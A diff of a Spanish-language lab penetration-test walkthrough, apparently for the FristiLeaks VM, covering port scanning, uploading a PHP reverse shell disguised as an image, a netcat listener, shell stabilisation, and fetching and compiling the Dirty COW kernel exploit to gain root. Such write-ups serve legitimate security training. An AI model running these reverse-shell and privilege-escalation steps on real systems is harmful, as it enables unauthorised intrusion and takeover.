@@ -7,12 +7,19 @@
 ```bash
 sudo netdiscover -r 10.0.2.0/24 -i eth0
 ```
+### Descubrimiento de puertos y servicios en el host objetivo
 
-### Descubrimiento de Puertos en objetivo
+```
+sudo nmap -sS -sC -sV -O 10.0.2.5  
+```
 
-PORT    | STATE  | SERVICE  | VERSION
---------|--------|----------|-------------
-80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+PORT   | STATE | SERVICE | VERSION
+-------|-------|---------|-----------------------------------------------
+80/tcp | open  | http    | Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+
+## Fase de Footprinting / Exploración (Scanning):
+
+### Exploracion puerto 80
 
 #### nuclei
 
@@ -31,7 +38,6 @@ PORT    | STATE  | SERVICE  | VERSION
 [apache-detect] [http] [info] http://10.0.2.7 ["Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3"]
 [php-detect] [http] [info] http://10.0.2.7
 [http-missing-security-headers:content-security-policy] [http] [info] http://10.0.2.7
-
 
 #### nikto
 
@@ -151,6 +157,8 @@ eezeepz puede ser usuario y con el keKkeKKeKKeKkEkkEk de antes.
 
 Una vez iniciado sesión vemos que podemos subir archivos .jpg , .png , .gif.
 
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
 Ahora editamos el php-reverse-shell.php
 
 ![image](https://hackmd.io/_uploads/ryp4vtbQ0.png)
@@ -163,4 +171,63 @@ Como comprobais, no se puede subir archivo con extensión .php, pero si probamos
 
 No olvideis hacer el ``nc -nlvp 443``
 
-#### Ruta del archivo : ip/fristi/uploads/php-reverse-shell.php.png
+Ruta del archivo : ip/fristi/uploads/php-reverse-shell.php.png
+
+Una vez obtenida para tener una shell completa hacemos estos pasos:
+
+script /dev/null -c bash
+Pulso CTRL + Z para dejar la zsh suspendida
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+
+uname -a
+
+2.6.32
+
+![alt text](image.png)
+
+
+site:exploit-db.com Linux Kernel 2.6
+
+
+![alt text](image-2.png)
+
+Dirty COW exploit.
+
+![alt text](image.png)
+
+└─$ cp /usr/share/exploitdb/exploits/linux/local/40839.c /home/kali 
+
+
+
+
+https://www.exploit-db.com/exploits/40839
+
+
+
+python3 -m http.server 8080
+
+![alt text](image-1.png)
+
+
+
+descargo el 40839.c en fristi con wget <ipkali:8080/40839.c>
+
+![alt text](image-2.png)
+
+compilar exploit en la maquina objetivo
+
+
+
+gcc -pthread 40839.c -o dirty -lcrypt
+
+chmod  +x dirty
+
+run exploit : ./dirty
+
+![alt text](image-3.png)
+
+nos pide clave pero le pulso intro y nos crea el usuario firefart con permisos root
+
